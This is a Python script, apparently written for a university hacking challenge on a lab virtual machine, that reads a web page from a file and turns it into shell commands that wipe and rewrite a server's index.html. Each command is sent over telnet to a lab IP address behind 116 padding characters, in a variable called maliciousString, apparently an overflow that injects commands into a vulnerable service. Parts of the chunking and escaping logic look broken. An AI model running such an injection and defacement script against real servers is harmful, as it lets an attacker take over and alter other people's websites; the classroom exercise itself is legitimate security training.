from os import system

def website_translator():
    #Doesn't translate greek chars
    n = 20
    print("Copy/paste the website code to be put online")
    
    file = open('new_website.txt')
    web = []
    
    for i in file:
        web.append(i[:-1])
        web.append([0])

    print("web is :", web)
    
    for i in range(len(web)):
        if web[i][0] != 0: 
            web[i] = [web[i][j:j+n] for j in range(0, len(web), n)]
            for j in range(len(web[i])):
                #evade special characters
                web[i][j] = web[i][j].replace('\"', '\\\\\"')
                web[i][j] = web[i][j].replace('/', '\/')
                web[i][j] = web[i][j].replace('&', '\&')
        

    return web

def main():
    
    #website = ["<!DOCTYPE html>", "<html>", "<head>", "<meta charset=\\\\\"utf-8\\\\\" />", "<title>INF4743 | &#956-challenge</title>", "</head>", "<body>", "<h1>MODAL HACK: &#956-challenge</h1>", "<hr>", "<p>(Write you name in the below to show that you managed to hack this VM)</p>", "Charles Nabbout", "</body>", "</html>"]

    website = website_translator()

    print("website is :", website)
    commands = []

    commands +=  ["echo \\\"<!--Ebited-->\\n\\\" > var/www/html/index.html"] #clear the page
    commands += ["sed -i \'\$s/$/{}/\' var/www/html/index.html".format(piece)  if piece != 0 else "echo \'\'>> var/www/html/index.html" for i in range(len(website)) for piece in website[i]] #insert previous code
    commands += ["cat var/www/html/index.html"] #show the edited page

    #commands += ["find / -name *.html 2>&1 test.txt", "cat test.txt"] #helps to find the page
    
    showResult = False

    nbChar = 116
    
        
    for cmd in commands:
        tmpString = '{{ echo \"{}{}'
        
        if(showResult):
            tmpString += '| sed \\\"\\\"'
        
        tmpString +=  '\";sleep .1; }} | telnet 192.168.56.101 1234'

        maliciousString = tmpString.format('a'*nbChar, cmd)
        system(maliciousString)
    

main()
